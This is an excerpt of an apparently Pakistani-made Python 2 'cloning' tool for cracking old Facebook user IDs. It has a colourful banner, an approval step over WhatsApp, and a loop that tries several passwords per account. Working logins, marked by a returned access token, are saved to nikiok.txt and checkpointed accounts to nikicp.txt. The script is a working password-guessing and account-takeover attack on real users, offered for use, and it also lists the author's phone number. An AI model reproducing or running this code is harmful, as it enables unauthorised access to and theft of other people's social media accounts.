...
logo3 = '\n\x1b[1;92m 888888888888\n     88\n| 88\n| 88   ,adPPYba,   8b,dPPYba,  \n| 88  a8"     "8a  88P'   "Y8  \n| 88  8b       d8  88\n| 88  "8a,   ,a8"  88\n88   `"YbbdP"'   88\n                                        \n\x1b[0;35m \n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY Mr. NAZIR\x1b[0m\n\x1b[1;91m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m Mr. NAZIR  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m+923025669420 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mTOOR.NAZIRO.AJMALO (NIKI) \n\x1b[1;91m-----------------------------------------------'
...
def reg2():
    ...
    os.system('am start https://wa.me/+923025669420?text=Please%20Give%20Me%20Approve%20Sir:%20' + id )
...
def login():
    ...
    print logo1
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m NAZIR OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
    print 47 * '\x1b[1;91m-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m [\x1b[1;92mNAZIR-OK\x1b[1;92m] ' + k + c + user + '  |  ' + pass1
                okb = open('nikiok.txt', 'a')
                okb.write(k + c + user + " | " + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [\x1b[1;91mTOR-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [\x1b[1;92mNAZIR-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass2
                    okb = open('nikiok.txt', 'a')
                    okb.write(k + c + user + " | " + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [\x1b[1;91mTOR-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('nikicp.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [\x1b[1;92mNAZIR-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass3
                        okb = open('nikiok.txt', 'a')
                        okb.write(k + c + user + " | " + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [\x1b[1;91mTOR-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('nikicp.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m [\x1b[1;92mNAZIR-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass4
                            okb = open('nikiok.txt', 'a')
                            okb.write(k + c + user + " | " + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m [\x1b[1;91mTOR-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass4
                            cps = open('nikicp.txt', 'a')
